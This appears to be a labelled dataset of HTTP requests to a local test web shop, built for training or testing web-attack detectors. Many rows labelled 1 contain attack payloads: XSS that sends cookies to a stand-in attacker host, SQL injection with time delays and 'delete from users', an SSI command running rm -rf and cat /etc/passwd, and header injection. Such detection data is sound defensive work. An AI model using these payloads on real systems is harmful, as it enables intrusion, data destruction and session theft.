,request,label
1662,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4752&b1=confirmar,0
1663,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
1664,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100&cantidad=74&b1=a�adir+al+carrito,0
1665,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
1666,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=falicov&password=desafinar&nombre=caleb&apellidos=hubach+larrumbe&email=ranez@sandrasummer.bi&dni=98501968y&direccion=calle+rafael+bravo+gomez+179+5?h&ciudad=santa+marta+de+tormes&cp=44394&provincia=�vila&ntc=1091303634326853&b1=registrar,0
1667,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pandrang&password=sabionda&nombre=edi&apellidos=nicol�s&email=woodburn@vinavilano.hr&dni=13026737c&direccion=de+los+cazadores,+196,+1-b&ciudad=villanueva+de+huerva&cp=31172&provincia=segovia&ntc=7280653157576508&b1=registrar",0
1668,gethttp://localhost:8080/tienda1/miembros/fotos.jsp,0
1669,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
1670,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cortie&password=se0am536e&nombre=kalanit&apellidos=solivellas+mantec�n&email=pouira@maridosadomicilio.ec&dni=86464472c&direccion=de+santiago+carrillo+solares+67,+8-f&ciudad=marrupe&cp=49123&provincia=toledo&ntc=1076281892196513&b1=registrar",0
1671,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1672,gethttp://localhost:8080/tienda1/publico/miembros.jsp,0
1673,gethttp://localhost:8080/tienda1/miembros/fotos.jsp,0
1674,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1675,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100&cantidad=68&b1=a�adir+al+carrito,0
1676,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
1677,gethttp://localhost:8080/tienda1/miembros/index.jsp,0
1678,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
1679,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=85&cantidad=33&b1=a�adir+al+carrito,0
1680,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1681,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1682,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1886&b1=pasar+por+caja,0
1683,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
1684,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=menasce&pwd=aburgues1rs7&remember=off&b1=entrar,0
1685,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
1686,gethttp://localhost:8080/tienda1/imagenes/1.gif,0
1687,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=levert&password=cant�brico&nombre=dels&apellidos=abaeto+sanchon&email=henson_shah@eco-pro.cx&dni=87337571q&direccion=castillo+de+segura+de+leon,+56,+10?c&ciudad=siurana&cp=19127&provincia=cuenca&ntc=5558396757589314&b1=registrar",0
1688,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bergland&pwd=85amo&remember=on&b1=entrar,0
1689,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1690,gethttp://localhost:8080/tienda1/global/menum.jsp,0
1691,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chueh5&pwd=rebotadera&remember=on&b1=entrar,0
1692,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1693,gethttp://localhost:8080/tienda1/global/menum.jsp,0
1694,gethttp://localhost:8080/tienda1/imagenes/3.gif,0
1695,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
1696,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3245&b1=confirmar,0
1697,gethttp://localhost:8080/tienda1/global/menum.jsp,0
1698,gethttp://localhost:8080/tienda1/index.jsp,0
1699,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
1700,gethttp://localhost:8080/tienda1/miembros/fotos.jsp,0
1701,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7146&b1=pasar+por+caja,0
1702,gethttp://localhost:8080/tienda1/imagenes/2.gif,0
1703,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
1704,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1705,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9448&b1=pasar+por+caja,0
1706,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=elliott&password=digitad$a&nombre=hildebaldo&apellidos=camarillo+guillen&email=armstrong@viajesnacionales.pn&dni=68623074k&direccion=c/+cubillo+aragon+45+&ciudad=solanillos+del+extremo&cp=33423&provincia=huelva&ntc=8388803635652672&b1=registrar,0
1707,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
1708,gethttp://localhost:8080/tienda1/publico/miembros.jsp,0
1709,gethttp://localhost:8080/tienda1/miembros/index.jsp,0
1710,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
1711,gethttp://localhost:8080/tienda1/global/titulo.jsp,0
1712,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=aileen&password=48c49p59a&nombre=rosana&apellidos=salaberri+d�vila&email=angold@callofduty6.nu&dni=93128213v&direccion=c/+periodista+jose+luis+de+cordoba,+16+&ciudad=rupit+i+pruit&cp=05202&provincia=cuenca&ntc=9449003562445265&b1=registrar",0
1713,gethttp://localhost:8080/tienda1/global/titulo.jsp,0
1714,gethttp://localhost:8080/tienda1/publico/miembros.jsp,0
1715,gethttp://localhost:8080/tienda1/global/estilos.css,0
1716,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
1717,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1718,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
1719,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=coralie&password=v70t4oso&nombre=odelsia&apellidos=cavall�+monn�&email=pages@spainbb.kh&dni=29967631b&direccion=pl.+campo+de+criptana,+47,+&ciudad=robledo,+el&cp=42214&provincia=salamanca&ntc=5044889825905516&b1=registrar",0
1720,gethttp://localhost:8080/tienda1/global/creditos.jsp,0
1721,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1722,gethttp://localhost:8080/tienda1/global/creditos.jsp,0
1723,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
1724,gethttp://localhost:8080/tienda1/global/estilos.css,0
1725,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1726,gethttp://localhost:8080/tienda1/miembros/fotos.jsp,0
1727,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
1728,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
1729,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1730,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
1731,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
1732,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
1733,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=28&b1=a�adir+al+carrito,0
1734,gethttp://localhost:8080/tienda1/imagenes/1.gif,0
1735,gethttp://localhost:8080/tienda1/miembros/fotos.jsp,0
1736,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
1737,gethttp://localhost:8080/tienda1/publico/miembros.jsp,0
1738,gethttp://localhost:8080/tienda1/miembros/fotos.jsp,0
1739,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
1740,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8271&b1=confirmar,0
1741,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1742,gethttp://localhost:8080/tienda1/global/creditos.jsp,0
1743,gethttp://localhost:8080/tienda1/index.jsp,0
1744,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=85&cantidad=61&b1=a�adir+al+carrito,0
1745,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
1746,gethttp://localhost:8080/tienda1/imagenes/1.gif,0
1747,gethttp://localhost:8080/tienda1/global/titulo.jsp,0
1748,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hua&pwd=saturnino&remember=on&b1=entrar,0
1749,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
1750,gethttp://localhost:8080/tienda1/imagenes/1.gif,0
1751,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7198&b1=pasar+por+caja,0
1752,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=469&b1=confirmar,0
1753,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
1754,gethttp://localhost:8080/tienda1/global/menum.jsp,0
1755,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shepperd&password=26gad76o&nombre=natural&apellidos=vilaubi+hosta&email=lockin.konstantia@modeloscaninos.kn&dni=12395217b&direccion=c/+motilla+19,+1c&ciudad=merca,+a&cp=10513&provincia=madrid&ntc=1611608298925836&b1=registrar",0
1756,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gabriele&pwd=alazana&remember=off&b1=entrar,0
1757,gethttp://localhost:8080/tienda1/miembros/salir.jsp,0
1758,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1759,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1760,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cang&pwd=poderdante&remember=off&b1=entrar,0
1761,gethttp://localhost:8080/tienda1/global/estilos.css,0
1762,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
1763,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1764,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=litt&pwd=eficiente&remember=on&b1=entrar,0
1765,gethttp://localhost:8080/tienda1/global/menum.jsp,0
1766,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
1767,gethttp://localhost:8080/tienda1/publico/miembros.jsp,0
1768,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=85&cantidad=81&b1=a�adir+al+carrito,0
1769,gethttp://localhost:8080/tienda1/miembros/salir.jsp,0
1770,gethttp://localhost:8080/tienda1/index.jsp,0
1771,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
1772,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
1773,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1774,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
1775,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1776,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=26&b1=a�adir+al+carrito,0
1777,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1778,gethttp://localhost:8080/tienda1/miembros/index.jsp,0
1779,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
1780,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1781,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lemieux4&password=llaga&nombre=fluvia&apellidos=streit+bellavista&email=cutler.hutton@the-white-pearl-resort.int&dni=27744538y&direccion=calle+puru�uela,+15+6?d&ciudad=sentiu+de+si�,+la&cp=34340&provincia=castell�n&ntc=2523504851273429&b1=registrar",0
1782,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1783,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
1784,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
1785,gethttp://localhost:8080/tienda1/global/creditos.jsp,0
1786,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=valle&password=0n9ped7&nombre=onofre&apellidos=bringu�+mulleras&email=tissot@twinjet.bs&dni=18243165w&direccion=c/+tercio+de+afora+99+8-b&ciudad=torre+alh�quime&cp=32654&provincia=burgos&ntc=7149449459754030&b1=registrar,0
1787,gethttp://localhost:8080/tienda1/miembros/salir.jsp,0
1788,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
1789,gethttp://localhost:8080/tienda1/global/estilos.css,0
1790,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lowietje&pwd=ex074ico&remember=off&b1=entrar,0
1791,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7728&b1=pasar+por+caja,0
1792,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1793,gethttp://localhost:8080/tienda1/global/titulo.jsp,0
1794,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
1795,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
1796,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=85&cantidad=39&b1=a�adir+al+carrito,0
1797,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
1798,gethttp://localhost:8080/tienda1/imagenes/3.gif,0
1799,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
0,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zander&password=arca�sta&nombre=zain&apellidos=espriella+morcossessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&email=skala@lamarsrl.la&dni=28264646s&direccion=nardo,+106,+7-h&ciudad=torrecampo&cp=46315&provincia=alicante&ntc=5436324330428646&b1=registrar",1
1,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ryerson&password=id�l5co&nombre=zeeb&apellidos=bonilla+laure&email=tyler.bousquet@smalltec.lv&dni=48972382t&direccion=calle+medellin+188,+3e&ciudad=mur.i.l/lo+de+r�o+leza&cp=37767&provincia=�vila&ntc=6414725645609263&b1=registrar",1
2,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=676&b1=confirmar,1
3,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
4,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1124&b1=pasar+por+caja|,1
5,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=herbie&pwd=,c1,uda/d738&remember=on&b1=entrar",1
6,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235,1
7,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lynnette&password=do&nombre=huen�&apellidos=busquet+ojelja&email=villafane@digitalcorp.cx&dni=05917539f&direccion=calle+regino+sainz+de+la+maza,+153,+9?g&ciudad=errigoiti&cp=16193&provincia=huesca&ntca=9511633114834484&b1=registrar",1
8,gethttp://localhost:8080/tienda1.old,1
9,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%7c&precio=6771&b1=pasar+por+caja,1
10,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
11,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=terryl&password=des9erco&nombrea=haroid&apellidos=dawaher&email=tchkhikvadze-castenada3@soymadrile�o.mu&dni=14559882p&direccion=c/+doctor+francisco+saiz+sanz,+159,+&ciudad=alberca,+la&cp=03770&provincia=salamanca&ntc=3772824400880183&b1=registrar",1
12,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=maciejew&pwd=de!senmara�ar&remember=on/&b1=entrar,1
13,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=abacus6&pwd=m8n71leta&remember=on/&b1=entrar,1
14,gethttp://localhost:8080/tienda1/global/.inc,1
15,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=vino+rioja&precio=85&cantidad=76&b1=a�adir+al+carrito,1
16,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2,1
17,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jiuhuai4&password=renombrada&nombre=vasty&apellidos=aceituno+masdevall&email=ronoro_dalya@foreignoffice.nu&dni=48258022c&direccion=via+apicola+45,+4?c&ciudad=santa+mar�a+de+sando&cp=47182&provincia=salamanca&ntca=9198580449925150&b1=registrar",1
18,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mau+rino&password=desaprovedhosa&nombre=guy&apellidos=peruyero+danis&email=sundbery-vonic@castigado.tf&dni=61857027e&direccion=c/+jose+maria+pereda,+49+&ciudad=chodes&cp=12319&provincia=albacete&ntc=8340633556666736&b1=registrar",1
19,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cassondr&password=i658ct8&nombre=alcides&apellidos=cabanilla+dumenj�&email=odermar@cafedeteatro.tj&dni=57363582h&direccion=calle+general+sanz+pastor+139+6c&ciudad=vila+de+cruces&cp=06185&provincia=ja�n&ntc=3802015475330512&b1=','0','0','0','0');waitfor+delay+'0:0:15';--",1
20,gethttp://localhost:8080/tienda1/publico/anadir.jsp.java,1
21,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lemaire&pwd=6abe934&remember=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&b1=entrar,1
22,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolahi45&pwd=69'c48ng,7,7a&remember=on&b1=entrar",1
23,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3f,1
24,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nafsika&password=malhecho&nombre=jesumina&apellidos=-p-i�a,na&email=cottrell@muchochinoenchina.tg&dni=44709161j&direccion=navaluenga,+120+11?a&ciudad=or�soain&cp=21840&provincia=cuenca&ntc=4344385269362154&b1=registrar",1
25,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
26,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=donita9&password=h�3ira&nombre=mikhail&apellidos=deulofeu&email=wiedlin_steppat@nanogenerador.ax&dni=47a55043y&direccion=barrio+tendetes,+65,+13-c&ciudad=puebla+del+salvador&cp=34468&provincia=girona&ntc=5144167134274894&b1=registrar",1
27,gethttp://localhost:8080/samples/sampsite/about.htm,1
28,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=fadhel&password=canaler3&nombre=damasio&apellidos=guito+mat�&email=stribling.bettin@bru�oseguridad.ye&dni=58753714f&direccion=calle+juan+bravo+193+&ciudad=tubilla+del+agua&cp=16340&provincia=?&ntc=4927358900726396&b1=registrar,1
29,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectassessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
30,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vanda&pwd=5esl4chu6002ra&remember=off+&b1=entrar,1
31,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=balbir&password=hastioso&nombre=le�n&apellidos=bergu�o+franceschini&email=gaynes_froud@gaudio.tm&dni=38682401n&direccion=pereiro,+1+9?b&ciudad=arandilla+del+arroyo&cpa=42180&provincia=palencia&ntc=8795418458283406&b1=registrar",1
32,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=88'+delete+from+users&b1=a�adir+al+carrito,1
33,gethttp://localhost:8080/tienda1/global/asf-logo-wide.gif/~,1
34,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=ques+o+manchego&precio=85&cantidad=10&b1=a�adir+al+carrito,1
35,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=philips&password=balconaje&nombre=hansel&apellidos=ponseti+vilarrasa&email=zonis-paola@interanuncios.hk&dni=52864416c&direccion=calle+el+labrador+s/n+13c&ciudad=san+isidro&cpa=04868&provincia=cuenca&ntc=1106332242886154&b1=registrar,1
36,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=virk&password=latrin5&nombre=roxana&apellidos=barbero+delgados&email=bonpart@produc@tosgarantizados.@ag&dni=91059337z&direccion=c/+llucena,+193+2h&ciudad=almu��car&cp=43248&provincia=barcelona&ntc=6935592091774249&b1=registrar",1
37,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=schute&pwd=co45amb,re5a&remember=off&b1=entrar",1
38,gethttp://localhost:8080/flash/java/javabean/flashjavabean.html,1
39,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100/&cantidad=48&b1=a�adir+al+carrito,1
40,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ingeberg&password=sahumador&nombre=silveria&apellidos=giglio+beitia&email=malik@clubdeviaje.so&dni=90164620c|&direccion=calle+agustin+parejo+s/n+&ciudad=tierzo&cp=45214&provincia=cuenca&ntc=1661352474337104&b1=registrar,1
41,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=paros%22%20style=%22background:url(javascript:alert('paros'))&pwd=ajote&remember=on&b1=entrar,1
42,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dickens&password=requeridor&nombre=bertilda&apellidos=scampini+benito&emaila=bevens@elbauldelosrefranes.gov&dni=25301830j&direccion=avinguda+joan+march,+14,+&ciudad=g�jar&cp=11630&provincia=las+palmas&ntc=4290013346826591&b1=registrar",1
43,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bourk&password=acomodamiento&nombre=rafferty<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&apellidos=aca+isach&email=lafuret@cortinas-de-aire.ai&dni=56038958x&direccion=gijon,+93,+6?e&ciudad=pozuelo&cp=41749&provincia=barcelona&ntc=4929562421029680&b1=registrar",1
44,gethttp://localhost:8080/tienda1/publico~,1
45,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kristjan&password=asiria&nombre=gertrudis&apellidosa=massafr�+danes&email=perier@chevrolet-volt.in&dni=39012557a&direccion=calle+alfonso+onceno,+167,+&ciudad=alcal�+del+j�car&cp=05210&provincia=la+rioja&ntc=2670726326457119&b1=registrar",1
46,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
47,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kapil&password=d1c36o4ca&nombre=berina+del+valle&apellidos=artico&email=meunier.langa@tintasultravioleta.al&dni=17826694s&direccion=c/+historiador+rodrigo+pertegas,+149,+8-e&ciudad=palafolls','0','0','0','0');waitfor+delay+'0:0:15';--&cp=25218&provincia=c�ceres&ntc=3256313581077416&b1=registrar",1
48,gethttp://localhost:8080/ibmwebas,1
49,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg/asf-logo-wide.gif/,1
50,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritobob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
51,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=doerr&password=8osqu85a7&nombre=remy&apellidos=tauler+sa-l-inero&email=akadeth_svojtka@privatebanking.com.pe&dni=98300353d&direccion=calle+equador+86,+&ciudad=sant+cugat+sesgarrigues&cp=17001&provincia=burgos&ntc=9853640605253421&b1=registrar",1
52,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=edlin4&password=9/p5t2r'7pia&nombre=ralston&apellidos=pe�afiel&email=valente.oray@enlapalma.com.sh&dni=91076650p&direccion=publicista+jose+alegria+156+&ciudad=alhambra&cp=09109&provincia=cuenca&ntc=2136567392890327&b1=registrar,1
53,gethttp://localhost:8080/tienda1/asf-logo-wide,1
54,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sheraton&password=d�m9d01&nombre=selenia&apellidos=vi�as+batle&email=tiger@risiberia.eu&dni=05265898w&direcciona=callejon+jorge+juan,+135+&ciudad=arafo&cp=09300&provincia=zamora&ntc=9475523758342240&b1=registrar",1
55,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=queso+manchego&precio=100&cantidad=30&b1=a�adir+al+carrito,1
56,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1063&b1=confirmar/,1
57,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sayeeda2&password=ce5ast20c?ea&nombre=rafi&apellidos=trill+argando�a&email=ardisson@ajuntamentdebarcelona20.nf&dni=21898288b&direccion=pl.+libertad+192,+&ciudad=torres+del+carrizal&cp=16393&provincia=albacete&ntca=9343823588037445&b1=registrar",1
58,gethttp://localhost:8080/tienda1/asf-logo-wide.gif/,1
59,"gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0','0','0');waitfor+delay+'0:0:15';--",1
60,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=emelia7&password=e6u*ipolado&nombre=gelsomino&apellidos=medio+bullones&email=radzum_noriega@alcantarapartners.hr&dni=15508885p&direccion=c/+cadernera,+180,+5?c&ciudad=b�veda&cp=06360&provincia=la+rioja&ntc=3331042207803695sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&b1=registrar",1
61,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
62,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tailor&pwd=inju2i44t2&remember=off/&b1=entrar,1
63,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
64,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ketan&pwd=mula,tizar&remember=off&b1=entrar",1
65,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=39/&cantidad=65&b1=a�adir+al+carrito,1
